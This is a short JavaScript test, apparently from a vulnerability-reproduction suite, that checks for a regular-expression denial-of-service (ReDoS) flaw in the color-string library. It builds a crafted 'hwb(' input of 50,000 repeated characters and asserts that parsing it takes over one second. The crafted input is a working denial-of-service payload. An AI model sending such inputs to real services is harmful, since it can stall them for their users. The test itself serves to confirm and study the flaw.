test("ReDoS in color-string", () => {
  const measureTime = require("../utils").measureTime;
  const colorString = require("color-string");
  let attack_str = "hwb(" + "1".repeat(50000) + "!";
  let t = measureTime(function () {
    colorString.get(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
